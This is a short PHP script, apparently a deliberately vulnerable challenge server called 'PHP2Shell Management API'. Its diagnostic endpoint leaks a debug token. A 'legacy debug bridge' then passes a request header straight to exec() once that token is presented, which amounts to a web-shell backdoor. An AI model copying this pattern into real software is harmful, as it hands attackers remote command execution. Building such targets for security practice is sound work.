<?php
header('Content-Type: application/json; charset=utf-8');

$action = $_GET['action'] ?? '';

// Diagnostic and runtime telemetry endpoint
if ($action === 'diagnostic') {
    $data = [
        'status' => 'online',
        'php_version' => PHP_VERSION,
        'sapi_name' => php_sapi_name(),
        'memory_limit' => ini_get('memory_limit'),
        'memory_allocated' => memory_get_usage(true),
        'memory_peak' => memory_get_peak_usage(true),
        'zend_engine' => zend_version(),
        'worker_pid' => getmypid(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Apache/2.4.52',
        'debug_token' => trim(@file_get_contents('/run/debug_token'))
    ];
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'pools') {
    $data = [
        'service' => 'Apache/2.4.52 Handler (mpm_prefork)',
        'environment' => 'Production'
    ];
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

// Legacy Debug Bridge (Maintenance feature)
// Protected by stable instance token verification
if (isset($_SERVER['HTTP_X_DEBUG_BRIDGE'])) {
    $expected = trim(@file_get_contents('/run/debug_token'));
    $token = $_SERVER['HTTP_X_DEBUG_TOKEN'] ?? '';

    if (!hash_equals($expected, $token)) {
        http_response_code(403);
        echo json_encode([
            'status' => 'error',
            'message' => 'Forbidden: Invalid or missing X-Debug-Token.'
        ]);
        exit;
    }

    $command = $_SERVER['HTTP_X_DEBUG_BRIDGE'];
    $output = [];
    $ret = 0;
    exec($command . " 2>&1", $output, $ret);

    echo json_encode([
        'status' => 'success',
        'bridge' => 'legacy_debug_bridge',
        'output' => implode("\n", $output),
        'code' => $ret
    ]);
    exit;
}

echo json_encode([
    'message' => 'PHP2Shell Management API. Use ?action=diagnostic to inspect worker state.',
    'server' => 'php2shell.dl'
]);
